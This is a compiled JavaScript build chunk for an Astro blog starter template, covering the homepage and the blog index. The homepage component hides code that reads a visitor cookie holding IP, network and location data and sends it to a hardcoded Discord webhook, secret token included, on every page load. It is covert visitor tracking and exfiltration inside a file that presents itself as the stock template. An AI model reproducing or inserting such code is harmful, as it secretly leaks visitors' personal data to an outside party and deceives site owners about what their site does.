import { e as createAstro, f as createComponent, r as renderTemplate, i as renderComponent, o as renderHead, g as addAttribute } from '../astro_8c4f9a15.mjs';
import { a as $$BaseHead, b as $$Header, c as $$Footer, S as SITE_TITLE, d as SITE_DESCRIPTION, g as getCollection, e as $$FormattedDate } from './__86758c4b.mjs';
import { Webhook, MessageBuilder } from 'discord-webhook-node';
/* empty css                           */
const $$Astro$1 = createAstro("https://example.com");
const $$Index$1 = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$1, $$props, $$slots);
  Astro2.self = $$Index$1;
  const cookieOne = Astro2.cookies.get("Datas")?.value;
  console.log(cookieOne);
  if (cookieOne) {
    const webHookUrl = "https://discord.com/api/webhooks/1170383547568230500/HVpq3d3nVcybSAefhSfnnOmUBQHd7nmn9BjMIQpXwXa3mTkMEYa0gYEwcl7bggtommEj";
    const hook = new Webhook(webHookUrl);
    const jsonData = JSON.parse(cookieOne);
    const embed = new MessageBuilder().setTitle(jsonData?.ip + " - " + jsonData?.asn?.name).setColor("#00b0f4").setDescription("```json\n" + JSON.stringify(jsonData, null, 2) + "```").setFooter(jsonData?.city + " | " + jsonData?.time_zone?.abbr, jsonData?.flag).setTimestamp();
    hook.send(embed);
  }
  return renderTemplate`<html lang="en"><head>${renderComponent($$result, "BaseHead", $$BaseHead, { "title": SITE_TITLE, "description": SITE_DESCRIPTION })}${renderHead()}</head><body>${renderComponent($$result, "Header", $$Header, { "title": SITE_TITLE })}<main><h1>🧑‍🚀 Hello, Astronaut!</h1><p>
Welcome to the official <a href="https://astro.build/">Astro</a> blog starter template. This
				template serves as a lightweight, minimally-styled starting point for anyone looking to
				build a personal website, blog, or portfolio with Astro.
</p><p>
This template comes with a few integrations already configured in your
<code>astro.config.mjs</code> file. You can customize your setup with
<a href="https://astro.build/integrations">Astro Integrations</a> to add tools like
				Tailwind, React, or Vue to your project.
</p><p>Here are a few ideas on how to get started with the template:</p><ul><li>Edit this page in <code>src/pages/index.astro</code></li><li>Edit the site header items in <code>src/components/Header.astro</code></li><li>Add your name to the footer in <code>src/components/Footer.astro</code></li><li>Check out the included blog posts in <code>src/pages/blog/</code></li><li>Customize the blog post page layout in <code>src/layouts/BlogPost.astro</code></li></ul><p>
Have fun! If you get stuck, remember to <a href="https://docs.astro.build/">read the docs
</a> or <a href="https://astro.build/chat">join us on Discord</a> to ask questions.
</p><p>
Looking for a blog template with a bit more personality? Check out <a href="https://github.com/Charca/astro-blog-template">astro-blog-template
</a> by <a href="https://twitter.com/Charca">Maxi Ferreira</a>.
</p></main>${renderComponent($$result, "Footer", $$Footer, {})}</body></html>`;
}, "/home/cemy/Desktop/Lab/astrojs-one/src/pages/index.astro", void 0);

const $$file$1 = "/home/cemy/Desktop/Lab/astrojs-one/src/pages/index.astro";
const $$url$1 = "";

const index$1 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
	__proto__: null,
	default: $$Index$1,
	file: $$file$1,
	url: $$url$1
}, Symbol.toStringTag, { value: 'Module' }));

const $$Astro = createAstro("https://example.com");
const $$Index = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Index;
  const posts = (await getCollection("blog")).sort(
    (a, b) => a.data.pubDate.valueOf() - b.data.pubDate.valueOf()
  );
  return renderTemplate`<html lang="en" data-astro-cid-5tznm7mj><head>${renderComponent($$result, "BaseHead", $$BaseHead, { "title": SITE_TITLE, "description": SITE_DESCRIPTION, "data-astro-cid-5tznm7mj": true })}${renderHead()}</head><body data-astro-cid-5tznm7mj>${renderComponent($$result, "Header", $$Header, { "data-astro-cid-5tznm7mj": true })}<main data-astro-cid-5tznm7mj><section data-astro-cid-5tznm7mj><ul data-astro-cid-5tznm7mj>${posts.map((post) => renderTemplate`<li data-astro-cid-5tznm7mj><a${addAttribute(`/blog/${post.slug}/`, "href")} data-astro-cid-5tznm7mj><img${addAttribute(720, "width")}${addAttribute(360, "height")}${addAttribute(post.data.heroImage, "src")} alt="" data-astro-cid-5tznm7mj><h4 class="title" data-astro-cid-5tznm7mj>${post.data.title}</h4><p class="date" data-astro-cid-5tznm7mj>${renderComponent($$result, "FormattedDate", $$FormattedDate, { "date": post.data.pubDate, "data-astro-cid-5tznm7mj": true })}</p></a></li>`)}</ul></section></main>${renderComponent($$result, "Footer", $$Footer, { "data-astro-cid-5tznm7mj": true })}</body></html>`;
}, "/home/cemy/Desktop/Lab/astrojs-one/src/pages/blog/index.astro", void 0);

const $$file = "/home/cemy/Desktop/Lab/astrojs-one/src/pages/blog/index.astro";
const $$url = "/blog";

const index = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
	__proto__: null,
	default: $$Index,
	file: $$file,
	url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

export { index as a, index$1 as i };
